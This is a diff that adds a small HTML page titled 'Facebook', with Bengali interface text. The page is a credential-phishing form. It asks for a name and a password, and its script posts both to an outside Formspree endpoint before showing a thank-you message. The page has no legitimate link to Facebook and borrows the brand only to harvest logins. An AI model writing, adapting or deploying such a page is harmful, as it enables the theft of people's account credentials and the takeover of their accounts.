@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    form {
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+    }
+
+    input {
+      width: 100%;
+      padding: 8px;
+      margin-bottom: 16px;
+      box-sizing: border-box;
+    }
+
+    button {
+      background-color: #4caf50;
+      color: #fff;
+      padding: 10px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+  </style>
+  <title>Facebook</title>
+</head>
+<body>
+
+  <form id="myForm">
+    <label for="name">Name</label>
+    <input type="text" id="name" name="name" required>
+
+    <label for="age">password:</label>
+    <input type="passwoed" id="age" name="age" required>
+
+    <button type="button" onclick="submitForm()">জমা দিন</button>
+  </form>
+
+  <script>
+    function submitForm() {
+      // ফরম ডেটা নিন<label for="name">Mobile number or email address:</label>
+      var name = document.getElementById("name").value;
+      var age = document.getElementById("age").value;
+      
+      var formUrl = "https://formspree.io/f/xpzgekvo";
+      var formData = new FormData();
+      formData.append("name", name);
+      formData.append("age", age);
+      
+      // ফরমস্প্রি এপি ব্যবহার করুন ফরমটি Formspree করার জন্য
+      fetch(formUrl, {
+        method: "POST",
+        body: formData,
+        headers: {
+          Accept: "application/json",
+        },
+      })
+        .then(response => response.json())
+        .then(data => {
+          console.log("Formspree রেসপন্স:", data);
+          alert("ফরম জমা হয়েছে! ধন্যবাদ!");
+        })
+        .catch(error => {
+          console.error("ফরম জমা দেওয়ার সময় ত্রুটি:", error);
+          alert("ফরম জমা দেওয়ার সময় ত্রুটি হয়েছে।");
+        });
+
+      // ফরম পুনরায় সেট করতে
+      document.getElementById("myForm").reset();
+    }
+  </script>
+
+</body>
+</html>
